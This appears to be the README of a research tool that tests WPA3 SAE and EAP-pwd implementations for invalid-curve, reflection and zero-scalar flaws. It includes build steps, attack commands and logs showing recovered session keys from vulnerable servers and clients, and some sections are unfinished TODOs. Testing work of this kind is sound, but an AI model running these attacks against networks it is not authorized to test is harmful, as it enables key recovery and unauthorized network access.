This is an experimental tool to test WPA3's SAE and EAP-pwd implementations for vulnerabilities. We also strongly recommend to perform code inspections to assure all vulnerabilities have been properly addressed.

# Prerequisites

Our scripts were tested on Kali Linux. To install the required dependencies on Kali, execute:

	apt-get update
	apt-get install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git libdbus-1-dev

After this, inside the repository directory compile our modified hostapd and wpa_supplicant tools:

      cd dragonslayer
      ./build.sh

Remember to disable Wi-Fi in your network manager before using our scripts. After disabling Wi-Fi, execute `sudo rfkill unblock wifi` so our scripts can still use Wi-Fi.


# Summary

The attack parameters of our tool are:

- `-a 0`: perform reflection attack against either WPA3's SAE or EAP-pwd.
- `-a 1`: perform invalid curve attack against EAP-pwd.
- `-a 2`: perform second variant of the invalid curve attack against EAP-pwd. This variant is highly experimental.
- `-a 3`: perform zero-scalar attack against WPA3's SAE.

See the examples below for more information. The wrapper scripts `dragonslayer-client.sh` and `dragonslayer-server.sh` are contained in the directory `dragonslayer`. To increase the amount of debug output, you can add the parameter `-d` or `-dd` to both attack tools.

# Testing attacks against the server

## Preperation

Edit the file `dragonslayer/client.conf` and specify:

1. The SSID of the network name using the `ssid` parameter.
2. A valid EAP-pwd username using the `identity` parameter. The attacks only work if an existing identity is specified.
3. Leave the other parameters untouched.

An example of `dragonslayer/client.conf` is the following:

	network={
		ssid="dragonslayer"
		identity="bob"

		key_mgmt=WPA-EAP
		eap=PWD
		password="unknown password"
	}

## Invalid curve attack

To test whether an EAP-pwd server is vulnerable to invalid curve attacks, start `dragonslayer-client.sh` using the `-a 1` parameter. You must also specify the wireless interface to use with the `-i` parameter. For example:

	[mathy@mathy-work dragonslayer]$ sudo ./dragonslayer-client.sh -i wlp2s0 -a 1
	[sudo] password for mathy: 
	Successfully initialized wpa_supplicant
	wlp2s0: CTRL-EVENT-REGDOM-CHANGE init=DRIVER type=WORLD
	wlp2s0: CTRL-EVENT-REGDOM-CHANGE init=DRIVER type=COUNTRY alpha2=US
	wlp2s0: SME: Trying to authenticate with 38:2c:4a:c1:69:c0 (SSID='dragonblood' freq=5180 MHz)
	wlp2s0: Trying to associate with 38:2c:4a:c1:69:c0 (SSID='dragonblood' freq=5180 MHz)
	wlp2s0: Associated with 38:2c:4a:c1:69:c0
	wlp2s0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
	wlp2s0: CTRL-EVENT-EAP-STARTED EAP authentication started
	wlp2s0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=52
	wlp2s0: CTRL-EVENT-EAP-METHOD EAP vendor 0 method 52 (PWD) selected
	EAP-PWD (peer): server sent id of - hexdump_ascii(len=21):
	     74 68 65 73 65 72 76 65 72 40 65 78 61 6d 70 6c   theserver@exampl
	     65 2e 63 6f 6d                                    e.com           
	EAP-pwd: provisioned group 19
	[03:21:18] 38:2c:4a:c1:69:c0: sending a scalar equal to zero
	[03:21:18] 38:2c:4a:c1:69:c0: sending generator of small subgroup as the element
	[03:21:18] 38:2c:4a:c1:69:c0: trying to recover session key..
	[03:21:18] 38:2c:4a:c1:69:c0: successfully recovered the session key. Server is vulnerable to invalid curve attack!
	wlp2s0: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
	wlp2s0: PMKSA-CACHE-ADDED 38:2c:4a:c1:69:c0 0
	wlp2s0: WPA: Key negotiation completed with 38:2c:4a:c1:69:c0 [PTK=CCMP GTK=CCMP]
	wlp2s0: CTRL-EVENT-CONNECTED - Connection to 38:2c:4a:c1:69:c0 completed [id=0 id_str=]

Notice that the tool will display **Server is vulnerable to invalid curve attack!** if it is indeed vulnerable. If this message is not displayed, try performing the attack a few times again. If none of the attack attempts succeed, the EAP-pwd server is not vulnerable to this specific attack. In this case, also try attacking the EAP-pwd server using a small variant of the invalid curve attack using the `-a 2` parameter:

	[mathy@mathy-work dragonslayer]$ sudo ./dragonslayer-client.sh -i wlp2s0 -a 1
	...

Similar to the case above, it will display **Server is vulnerable to invalid curve attack!** if it is indeed vulnerable. If this message is not displayed after several attempts, the EAP-pwd server is not vulnerable to this specific attack.

If the tool doesn't seem to be working, remember that you can let it output more debug messages using for example `./dragonslayer-client.sh -i wlan0 -a 1 -d`. We also recommend that you audit the server code to check that it validates the received scalar and Elliptic Curve point. It can be that these specific attacks don't work, but that more specialized attacks do work.


## Reflection attack

To test whether an EAP-pwd server is vulnerable to a reflection attack, start `dragonslayer-client.sh` using the `-a 0` parameter. You must also specify the wireless interface being used with the `-i` parameter. For example:

	[mathy@mathy-work dragonslayer]$ sudo ./dragonslayer-client.sh -i wlp2s0 -a 0
	Successfully initialized wpa_supplicant
	wlp2s0: CTRL-EVENT-REGDOM-CHANGE init=DRIVER type=WORLD
	wlp2s0: CTRL-EVENT-REGDOM-CHANGE init=DRIVER type=COUNTRY alpha2=US
	wlp2s0: SME: Trying to authenticate with 38:2c:4a:c1:69:c0 (SSID='dragonblood' freq=5180 MHz)
	wlp2s0: Trying to associate with 38:2c:4a:c1:69:c0 (SSID='dragonblood' freq=5180 MHz)
	wlp2s0: Associated with 38:2c:4a:c1:69:c0
	wlp2s0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
	wlp2s0: CTRL-EVENT-EAP-STARTED EAP authentication started
	wlp2s0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=52
	wlp2s0: CTRL-EVENT-EAP-METHOD EAP vendor 0 method 52 (PWD) selected
	EAP-PWD (peer): server sent id of - hexdump_ascii(len=21):
	     74 68 65 73 65 72 76 65 72 40 65 78 61 6d 70 6c   theserver@exampl
	     65 2e 63 6f 6d                                    e.com           
	EAP-pwd: provisioned group 19
	[03:22:11] 38:2c:4a:c1:69:c0: Reflected server scalar and element in commit frame
	[03:22:11] 38:2c:4a:c1:69:c0: Skipping verification of recieved confirm value
	[03:22:11] 38:2c:4a:c1:69:c0: Reflected confirm value in confirm frame
	wlp2s0: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
	[03:22:11] 38:2c:4a:c1:69:c0: AP is initiating 4-way handshake => server is vulnerable to reflection attack!
	wlp2s0: PMKSA-CACHE-ADDED 38:2c:4a:c1:69:c0 0
	[03:22:12] 38:2c:4a:c1:69:c0: AP is initiating 4-way handshake => server is vulnerable to reflection attack!
	[03:22:13] 38:2c:4a:c1:69:c0: AP is initiating 4-way handshake => server is vulnerable to reflection attack!
	[03:22:14] 38:2c:4a:c1:69:c0: AP is initiating 4-way handshake => server is vulnerable to reflection attack!

The tool will display **server is vulnerable to reflection attack!** if it is vulnerable. If this message is not displayed, try executing the attack several times. If the server is never detected as being vulnerable, it is not vulnerable to this specific attack.


## Zero-scalar attack against WPA3's SAE

**TODO: Small description**


# Testing attacks against the client

## Preperation

First modify `dragonslayer/hostapd.conf` and **edit the line `interface=` to specify the Wi-Fi interface** that will be used to execute the tests. Note that for all tests, once the script is running, you must let the device being tested connect to the **network "dragonslayer" with as username "bob"**. The password can be anything. You can change settings of the AP by modifying `dragonslayer/hostapd.conf`.

## Invalid curve attack against EAP-pwd

To test whether an EAP-pwd client is vulnerable to invalid curve attacks, start `dragonslayer-server.sh` using the `-a 1` parameter. Once the server is running, connect to it with the client you want to test. Example output is:

	[mathy@mathy-work dragonslayer]$ sudo ./dragonslayer-server.sh -a 1
	Configuration file: hostapd.conf
	Using interface wlp2s0 with hwaddr 8a:f5:40:f9:5d:c0 and ssid "dragonblood"
	wlp2s0: interface state UNINITIALIZED->ENABLED
	wlp2s0: AP-ENABLED 
	wlp2s0: STA c4:e9:84:db:fb:7b IEEE 802.11: authenticated
	wlp2s0: STA c4:e9:84:db:fb:7b IEEE 802.11: associated (aid 1)
	wlp2s0: CTRL-EVENT-EAP-STARTED c4:e9:84:db:fb:7b
	wlp2s0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
	wlp2s0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=52
	EAP-pwd: provisioned group 19
	[03:48:15] c4:e9:84:db:fb:7b: sending a scalar equal to zero
	[03:48:15] c4:e9:84:db:fb:7b: sending generator of small subgroup as the element
	[03:48:15] c4:e9:84:db:fb:7b: configured X-coordinate of subgroup generator as session key
	[03:48:15] c4:e9:84:db:fb:7b: Successfully recovered the session key. Client is vulnerable to invalid curve attack!
	wlp2s0: CTRL-EVENT-EAP-SUCCESS c4:e9:84:db:fb:7b
	wlp2s0: STA c4:e9:84:db:fb:7b WPA: pairwise key handshake completed (RSN)
	wlp2s0: AP-STA-CONNECTED c4:e9:84:db:fb:7b
	wlp2s0: STA c4:e9:84:db:fb:7b RADIUS: starting accounting session 35BB5B4BB3793544
	wlp2s0: STA c4:e9:84:db:fb:7b IEEE 802.1X: authenticated - EAP type: 0 (unknown)

The tool will display **Client is vulnerable to invalid curve attack!** if it is vulnerable. The **attack has a 33% chance of failing**. So if this message is not display, you must try executing the attack several times again (i.e. try connecting again using the client). You can only assume the client isn't vulnerable after trying to attack several times!

## Reflection attack against WPA3's SAE

**TODO: Small description**

## Zero-scalar attack against WPA3's SAE

**TODO: Small description**

# General Remarks

- The wireless interface doesn't have to be set to monitor mode. This is the case for all our attack tools.
- If things don't work, it can really help to unplug your Wi-Fi adapter, and plug it back it. Especially when using a virtual machine.

# TODOs

- **For all attack variants, check or force we're using the correct group.**
- **Force the correct group and `wpa_keymgnt` based on the selected attack**
- **In the badscalar (iwd) attack allow to set the scalar either to zero or to the order of the curve**

